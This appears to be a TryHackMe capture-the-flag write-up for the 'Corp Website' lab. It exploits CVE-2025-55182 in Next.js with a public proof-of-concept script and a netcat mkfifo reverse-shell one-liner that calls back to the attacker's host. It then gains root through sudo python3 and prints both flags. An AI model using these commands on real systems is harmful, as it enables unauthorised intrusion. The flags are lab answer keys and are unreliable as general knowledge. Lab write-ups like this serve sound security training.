# TryHackMe: Corp Website

- **Machine Name:** Corp Website
- **Difficulty:** Medium
- **Category**: Web / Linux PrivEsc
-----

## 1. Reconnaissance

First, connect to the VPN network and verify the assigned target IP address. We know the target port is `3000`.

Open the site in a browser. We see a static application. To identify the underlying technologies, we use the **Wappalyzer** plugin. It reveals:

- **Framework:** Next.js v16.0.6
    
- **Library:** React
    
<img width="468" height="467" alt="Screenshot_20260215_113425" src="https://github.com/user-attachments/assets/5c2fb61a-fa9a-47de-be65-c4c7ee651ba8" />


**Analysis:** The Next.js version (16.0.6) immediately grabs our attention. In early December 2025, a critical vulnerability known as **React2shell (CVE-2025-55182)** was disclosed. This is an **RCE (Remote Code Execution)** vulnerability in React Server Components caused by unsafe deserialization. It allows an attacker to execute code remotely on the server.

> **Beginner Tip:** Always check software versions. If a version falls into a known vulnerable range (in this case, unpatched Next.js), it’s a potential entry point.

More about the vulnerability: https://www.offsec.com/blog/cve-2025-55182/

## 2. Exploitation

To verify this, we use a ready-made PoC exploit: [[GitHub Link]](https://github.com/surajhacx/react2shellpoc/tree/main)

We run the script to test if we can execute commands. Let's try the `id` command to see which user we are running as:

```bash
  
╭─░▒▓    /home/raine/Downloads  
╰─ python3 exploit.py -t http://10.82.175.80:3000 -c 'id'                                                                                
  
  
     /\  
    /**\  
   /****\  
  /******\  
 /********\  
/**********\  
     ||  
  
   [CVE-2025-55182 React Server Components RCE]  
  
  
[*] EXPLOITATION PARAMETERS  
────────────────────────────────────────────────────────────  
 TARGET    : http://10.82.175.80:3000  
 PAYLOAD   : id  
────────────────────────────────────────────────────────────  
  
[*] Initiating exploitation sequence...  
[*] Establishing connection to target...  
  
[+] EXPLOITATION SUCCESSFUL  
────────────────────────────────────────────────────────────  
 ▸ uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup)  
────────────────────────────────────────────────────────────

```

The vulnerability is confirmed; we have RCE.

## 3. Gaining Access (Reverse Shell)

Now we need to turn this simple command execution into a full interactive session.

1. Start a listener on your attacking machine:
    
    ```bash
    nc -lvnp 6666
    ```
    
2. Send a reverse shell payload via the exploit. We’ll use a classic one-liner:

    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR_VPN_IP> 6666 >/tmp/f
    ```
    

**Result:** We catch the connection in our terminal. Let's grab the user flag:

```bash
/app $ cat /home/daniel/user.txt
THM{R34c7_2_5h311_3xpl017}
```

## 4. Privilege Escalation

We check which commands the current user can execute as `root` (administrator) without a password:

Bash

```bash
sudo -l
```

**Output:**

```bash
User daniel may run the following commands on romance:
   (root) NOPASSWD: /usr/bin/python3
```

We can run Python 3 as root. This is a guaranteed path to privilege escalation.

**Attempt 1 (Failed):** We try to spawn a `/bin/bash` shell:

Bash

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
# Error: sh: /bin/bash: not found
```

_Why did this happen?_ The server is likely running a minimal Linux version (like Alpine), which doesn't have `bash` installed, but has `sh`.

**Attempt 2 (Success):** We change the shell to `/bin/sh`:

Bash

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

Check permissions and grab the root flag:

Bash

```
id
# uid=0(root) gid=0(root)...

cat /root/root.txt
# THM{Pr1v_35c_47_175_f1n357}
```

**Let's summarize.** For pentesters: Always check the versions of target frameworks/services to identify popular CVEs. For developers: Always update the frameworks/services your application runs on to the latest version.
